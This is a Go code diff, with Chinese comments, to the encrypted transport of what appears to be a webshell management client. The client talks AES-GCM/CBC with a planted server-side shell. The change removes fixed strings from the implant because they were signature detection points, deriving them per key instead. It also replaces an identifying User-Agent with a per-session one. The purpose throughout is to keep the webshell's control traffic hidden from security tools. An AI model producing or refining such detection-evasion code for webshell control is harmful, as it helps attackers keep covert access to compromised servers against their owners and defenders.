@@ -74,6 +74,7 @@ type encTransport struct {
 	url    string
 	key    []byte
 	client *http.Client
+	ua     string // 会话级 UA(与明文通道同一份,见 HTTPShell.ua)
 
 	mu   sync.RWMutex
 	mode string // "" 未锁存;"gcm" / "cbc"
@@ -97,6 +98,16 @@ func (t *encTransport) SetMode(m string) {
 }
 
 // ---------------- 加解密原语(驱动与测试模拟马共用) ----------------
+
+// encDomains 由会话密钥派生 CBC 路径的两个域分隔串(批 7 P0-4:不再用固定的
+// "artex-enc-v1"/"artex-mac-v1"——马体里的固定串是签名命中点)。派生而非独立随机,
+// 是为了让驱动侧仅凭密钥即可复现(域串随马体落目标侧,本来就是非秘密;密钥在马体
+// 与 Secret 两侧都在,派生不增加任何暴露面)。生成器(shellgen)按同一算法写入马体。
+func encDomains(key []byte) (enc, mac string) {
+	e := sha256.Sum256(append(append([]byte(nil), key...), 0xE1))
+	m := sha256.Sum256(append(append([]byte(nil), key...), 0xAC))
+	return hex.EncodeToString(e[:])[:16], hex.EncodeToString(m[:])[:16]
+}
 
 // encSubKey 派生 CBC 路径子密钥:sha256(key || 域分隔串)。
 func encSubKey(key []byte, domain string) []byte {
@@ -178,7 +189,8 @@ func encCrypt(key []byte, mode string, frame []byte) ([]byte, error) {
 		padded := pkcs7Pad(frame, aes.BlockSize)
 		ct := make([]byte, len(padded))
 		cipher.NewCBCEncrypter(block, iv).CryptBlocks(ct, padded)
-		mac := hmac.New(sha256.New, encSubKey(key, "artex-mac-v1"))
+		_, macDom := encDomains(key)
+		mac := hmac.New(sha256.New, encSubKey(key, macDom))
 		mac.Write(iv)
 		mac.Write(ct)
 		out := make([]byte, 0, len(iv)+len(ct)+encCBCMAC)
@@ -216,7 +228,8 @@ func encDecrypt(key []byte, mode string, blob []byte) ([]byte, error) {
 		iv := blob[:encCBCIV]
 		ct := blob[encCBCIV : len(blob)-encCBCMAC]
 		mac := blob[len(blob)-encCBCMAC:]
-		m := hmac.New(sha256.New, encSubKey(key, "artex-mac-v1"))
+		_, macDom := encDomains(key)
+		m := hmac.New(sha256.New, encSubKey(key, macDom))
 		m.Write(iv)
 		m.Write(ct)
 		if !hmac.Equal(mac, m.Sum(nil)) {
@@ -256,7 +269,7 @@ func (t *encTransport) doOnce(ctx context.Context, req encRequest, mode string, 
 		return nil, opError("http", "构造请求失败: %v", err)
 	}
 	hreq.Header.Set("Content-Type", "text/plain")
-	hreq.Header.Set("User-Agent", "Mozilla/5.0 (ARTEX)")
+	hreq.Header.Set("User-Agent", t.ua)
 	resp, err := t.client.Do(hreq)
 	if err != nil {
 		return nil, opError("http", "HTTP 请求失败（目标不可达/超时/连接重置）: %v", err)
@@ -365,7 +378,7 @@ func NewEncShell(shellURL, lang, keyB64 string) (*HTTPShell, error) {
 		return nil, err
 	}
 	s.kind = "http_" + lang + "enc"
-	s.enc = &encTransport{url: s.url, key: key, client: s.client}
+	s.enc = &encTransport{url: s.url, key: key, client: s.client, ua: s.ua}
 	return s, nil
 }
 
